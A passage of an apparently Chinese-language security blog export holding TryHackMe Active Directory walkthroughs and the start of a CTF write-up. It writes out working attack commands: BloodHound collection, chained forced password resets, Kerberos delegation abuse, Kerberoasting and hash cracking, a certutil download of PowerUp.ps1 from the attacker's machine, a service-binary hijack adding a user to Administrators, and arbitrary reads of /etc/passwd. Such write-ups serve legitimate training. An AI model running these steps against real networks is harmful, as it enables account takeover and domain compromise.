class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u TABATHA_BRITT -p <span class="string">&#x27;marlboro(1985)&#x27;</span> -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025161327821-1280956437.png" alt="image-20241025161304577">将收集的信息使用<code>Bloodhound</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162900833-2005768447.png" alt="image-20241025162837120"></p><p>找到利用链，我们想要到达<code>DARLA_WINTERS</code>，就是从<code>TABATHA_BRITT</code>到<code>SHAWMA_BRAY</code>的<code>GenericAll</code>，利用<code>ForceChangePassword</code>从<code>SHAWMA_BRAY</code>到<code>CRUZZ_HALL</code>，最后利用<code>GenericWrite</code>从<code>CRUZ_HALL</code>到<code>DARLA_WINTERS</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162314922-442943433.png" alt="image-20241025162252026"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025162215576-292168178.png" alt="image-20241025162152712"></p><p>我们发现可以通过<code>RPC</code>利用<code>GenericAll</code>更改用户的密码，对于<code>ForceChangePassword</code>和<code>GenericWrite</code>同样可以适用</p><p>我们使用<code>TABATHA_BRITT</code>用户来操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net rpc password <span class="string">&quot;SHAWNA_BRAY&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;thm.corp&quot;</span>/<span class="string">&quot;TABATHA_BRITT&quot;</span>%<span class="string">&quot;marlboro(1985)&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br><span class="line"></span><br><span class="line">net rpc password <span class="string">&quot;CRUZ_HALL&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;THM.CORP&quot;</span>/<span class="string">&quot;SHAWNA_BRAY&quot;</span>%<span class="string">&quot;Aa123456!&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br><span class="line"></span><br><span class="line">net rpc password <span class="string">&quot;DARLA_WINTERS&quot;</span> <span class="string">&quot;Aa123456!&quot;</span> -U <span class="string">&quot;THM.CORP&quot;</span>/<span class="string">&quot;CRUZ_HALL&quot;</span>%<span class="string">&quot;Aa123456!&quot;</span> -S <span class="string">&quot;10.10.219.65&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025164851767-362787753.png" alt="image-20241025164828710"></p><p>使用<code>crackmapexec</code>验证一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.219.65 -u DARLA_WINTERS -p <span class="string">&#x27;Aa123456!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025165457028-896741427.png" alt="image-20241025165434092"></p><p>修改成功！再对<code>DARLA_WINTERS</code>信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u <span class="string">&#x27;DARLA_WINTERS&#x27;</span> -p <span class="string">&#x27;Aa123456!&#x27;</span> -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025172857716-1006065661.png" alt="image-20241025172834592"></p><p>发现<code>DARLA_WINTERS</code>用户可以通过<code>CIFS</code>服务进行委派攻击，我们就可以模拟域控上<code>CIFS</code>服务的管理员</p><h2 id="委派攻击"><a href="#委派攻击" class="headerlink" title="委派攻击"></a>委派攻击</h2><p><code>Impacket</code> 的<code>getST</code>脚本将请求服务的<code>Ticket</code> 并将其保存为 <code>ccache</code>。如果帐户具有受限的委派权限，可以使用 <code>-impersonate</code> 标志代表其他用户请求票证。</p><p>使用 <code>impacket</code> 的<code>getST.py</code>获取票据</p><p>在请求票据之前，我们先输入下面这个命令。这个命令可以从指定的 NTP 服务器上获取准确的时间，并将系统时间调整到与之同步。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntpdate -s haystack.thm.corp</span><br></pre></td></tr></table></figure><p>然后再开始获取票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py -spn <span class="string">&quot;cifs/haystack.thm.corp&quot;</span> -dc-ip 10.10.219.65 -impersonate <span class="string">&quot;Administrator&quot;</span> <span class="string">&quot;thm.corp/DARLA_WINTERS:Aa123456!&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025175746257-1822396632.png" alt="image-20241025175722380"></p><p>使用<code>KRB5CCNAME</code>环境变量设置 <code>ccache</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache</span><br></pre></td></tr></table></figure><p>再使用<code>wmiexec.py</code>登录<code>Administrator</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -k -no-pass Administrator@haystack.thm.corp</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025181710304-1116480087.png" alt="image-20241025181646460"></p><p>成功获得<code>Administrator</code>的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025181908376-2067529138.png" alt="image-20241025181845059"></p><p>在<code>Desktop</code>找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> THM </tag>
            
            <tag> Active Directory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Enterprise</title>
      <link href="/posts/f6320aec.html"/>
      <url>/posts/f6320aec.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.76.81</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.184.113</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-23 15:44 CST</span><br><span class="line">Warning: 10.10.184.113 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.184.113</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 59956 closed tcp ports (reset), 5552 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-23 07:44:58Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: LAB-ENTERPRISE</span><br><span class="line">|   NetBIOS_Domain_Name: LAB-ENTERPRISE</span><br><span class="line">|   NetBIOS_Computer_Name: LAB-DC</span><br><span class="line">|   DNS_Domain_Name: LAB.ENTERPRISE.THM</span><br><span class="line">|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="line">|   DNS_Tree_Name: ENTERPRISE.THM</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-23T07:46:13+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM</span><br><span class="line">| Not valid before: 2024-10-22T07:43:23</span><br><span class="line">|_Not valid after:  2025-04-23T07:43:23</span><br><span class="line">|_ssl-date: 2024-10-23T07:46:26+00:00; -1s from scanner time.</span><br><span class="line">5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Service Unavailable</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">7990/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Log in to continue - Log in with Atlassian account</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49671/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49679/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49707/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49713/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.94SVN%E=4%D=10/23%OT=53%CT=1%CU=31414%PV=Y%DS=2%DC=T%G=Y%TM=671</span><br><span class="line">OS:8A9DA%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=RD%II=I%SS=</span><br><span class="line">OS:S%TS=U)SEQ(SP=102%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=102%GCD=</span><br><span class="line">OS:1%ISR=10C%TI=I%CI=RD%II=I%SS=S%TS=U)SEQ(SP=103%GCD=1%ISR=10C%TI=I%CI=I%I</span><br><span class="line">OS:I=I%SS=S%TS=U)OPS(O1=M509NW8NNS%O2=M509NW8NNS%O3=M509NW8%O4=M509NW8NNS%O</span><br><span class="line">OS:5=M509NW8NNS%O6=M509NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=F</span><br><span class="line">OS:F70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M509NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A</span><br><span class="line">OS:=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=</span><br><span class="line">OS:Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R</span><br><span class="line">OS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=</span><br><span class="line">OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U</span><br><span class="line">OS:1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DF</span><br><span class="line">OS:I=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -1s, deviation: 0s, median: -1s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-23T07:46:15</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 199/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   359.39 ms 10.14.0.1</span><br><span class="line">2   360.71 ms 10.10.184.113</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 144.50 seconds</span><br></pre></td></tr></table></figure><p>不难看出这是一台域控机器，开放了若干端口，域名为<code>LAB.ENTERPRISE.THM</code>，将其添加到<code>/etc/hosts</code>文件中</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023164304313-1442381621.png" alt="image-20241023164242012"></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>先简单探测下smb服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.184.113</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155144317-1847528457.png" alt="image-20241023155122981"></p><p>发现一些共享目录，尝试匿名登陆访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.184.113/Docs</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155531326-846039650.png" alt="image-20241023155511089"></p><p>发现两个文件<code>get</code>下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.184.113/Users</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155623661-1766656713.png" alt="image-20241023155603137"></p><p>把<code>desktop.ini</code>下载下来，同时在<code>Users</code>目录中，找到一些用户名</p><p>将用户名保存下来</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023155922742-1623262837.png" alt="image-20241023155901976"></p><p>在<code>Default</code>目录中找到些文件，查看一下之前下载的文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160456960-1428865174.png" alt="image-20241023160434574"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160539318-945036663.png" alt="image-20241023160516110"></p><p>发现这两个文件需要密码才能查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160627583-292902303.png" alt="image-20241023160602672"></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160131115-1178226363.png" alt="image-20241023160110776"></p><p>默认页面没什么信息，扫描一下后台</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160734235-742745560.png" alt="image-20241023160710469"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023160820658-791344310.png" alt="image-20241023160753616"></p><p>没啥用</p><h2 id="7990端口"><a href="#7990端口" class="headerlink" title="7990端口"></a>7990端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162220892-1397336076.png" alt="image-20241023162156550"></p><p>这是一个<code>Atlassian</code>并且发现内容是<code>Enterprise-THM</code>，正在迁移至github，我们上去google搜索一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162740885-2011563018.png" alt="image-20241023162718049"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023162838024-1090127372.png" alt="image-20241023162813746"></p><p>注意到有个用户<code>Nik-enterprise-dev</code>，里面有一个库<code>mgmtScript.ps1</code>，库里面还有个ps1文件<code>mgmtScript.ps1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023163037619-1307610051.png" alt="image-20241023163010726"></p><p>查看一下历史记录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023163133624-1566744799.png" alt="image-20241023163105667"></p><p>发现了他的用户名及密码<code>nik:ToastyBoi!</code></p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p>有了一组用户凭据，尝试探测一下<code>rpc</code>，枚举一下用户</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpcclient lab.enterprise.thm -U nik --password=<span class="string">&quot;ToastyBoi!&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023190844546-934835508.png" alt="image-20241023190823732"></p><p>找到很多域用户，将其保存到<code>users</code>文件中，方便后续利用</p><h1 id="rdp登录bitbucket"><a href="#rdp登录bitbucket" class="headerlink" title="rdp登录bitbucket"></a>rdp登录bitbucket</h1><p>有了一组凭据和用户名列表就可以尝试<code>AS-REP Roasting</code>，检查一下域中用户是否有用户禁用了预身份验证，如果有的话，我们就可以请求<code>TGT</code>密钥，就可以尝试离线破解密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py lab.enterprise.thm/ -usersfile <span class="built_in">users</span> -dc-ip 10.10.184.113</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023194833249-196889267.png" alt="image-20241023194812832"></p><p>接下来查看是否有用户设置了<code>SPN</code>，如果有的话，我们可以请求<code>TGS</code>密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi!</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023185802387-322860292.png" alt="image-20241023185741834"></p><p>发现<code>bitbucket</code>用户设置了<code>SPN</code>，我们请求<code>TGS</code>并尝试破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -request</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023185920000-1248219664.png" alt="image-20241023185859159"></p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023195207909-243147148.png" alt="image-20241023195147299"></p><p>爆破出密码<code>littleredbucket</code></p><p>rdp尝试登陆</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /u:bitbucket /p:littleredbucket /v:lab.enterprise.thm</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023203011100-308824680.png" alt="image-20241023202950998"></p><p>在桌面找到<code>user.txt</code></p><h1 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h1><p>使用<code>PowerUp.ps1</code>来分析可能提升权限的漏洞，将文件传到靶机上</p><p>攻击机启动python服务</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241023210727187-1693192503.png" alt="image-20241023210705120"></p><p>从受害者机器上，我们使用<code>certutil</code>从 <code>Powershell</code> 获取可执行文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe <span class="literal">-urlcache</span> <span class="operator">-f</span> http://<span class="number">10.14</span>.<span class="number">90.122</span>:<span class="number">8000</span>/PowerUp.ps1 PowerUp.ps1</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024160000887-1751636811.png" alt="image-20241024155939035"></p><p>运行<code>PowerUp.ps1</code>后执行<code>Invoke-AllChecks</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024161255216-268400229.png" alt="image-20241024161233438"></p><p>我们发现<code>zerotieroneservice</code>是作为<code>SYSTEM</code>运行的，并且可以重启该服务</p><p>使用下面的命令滥用此功能，将当前用户<code>bitbucket</code>添加到管理员组</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Install-ServiceBinary</span> <span class="literal">-Name</span> <span class="string">&quot;zerotieroneservice&quot;</span> <span class="literal">-Command</span> <span class="string">&quot;net localgroup Administrators lab.enterprise.thm\bitbucket /add&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162013069-1833540896.png" alt="image-20241024161951199"></p><p>执行后，我们重启<code>zerotieroneservice</code>服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe stop zerotieroneservice</span><br><span class="line">sc.exe <span class="built_in">start</span> zerotieroneservice</span><br></pre></td></tr></table></figure><p>查看一下当前用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user bitbucket</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162313666-1753984328.png" alt="image-20241024162251879"></p><p>发现我们当前属于<code>Administrator</code>组</p><p>使用<code>evil-winrm</code>登录（使用evil-winrm的原因纯粹是因为我rdp登录卡的要死）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.76.81 -u bitbucket -p littleredbucket</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241024162856683-1105115210.png" alt="image-20241024162834485"></p><p>找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> THM </tag>
            
            <tag> Active Directory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态 2024</title>
      <link href="/posts/c9a637a4.html"/>
      <url>/posts/c9a637a4.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="capoo-一血"><a href="#capoo-一血" class="headerlink" title="capoo (一血)"></a>capoo (一血)</h2><p>爽喽</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093643112-333016867.png" alt="image-20241019162216319"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093709026-2029109064.png" alt="image-20241019151935942"></p><p>f12发<img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093741131-1763474644.png" alt="image-20241019152114885">现读的图片，感觉应该能任意文件读取，读一下<code>/etc/passwd</code></p><p>发现能读，再看一下环境变量<code>/proc/1/environ</code>，没有</p><p>再看一下<code>/proc/1/cmdline</code>，发现存在<code>/bin/sh/docker-entrypoint.sh</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093821659-1694154678.png" alt="image-20241019152243867"></p><p>再尝试一下start.sh</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021093836336-503712739.png" alt="image-20241019152349796"></p><p>找到flag名称，直接读就能出flag</p><h2 id="ez-picker"><a href="#ez-picker" class="headerlink" title="ez_picker"></a>ez_picker</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 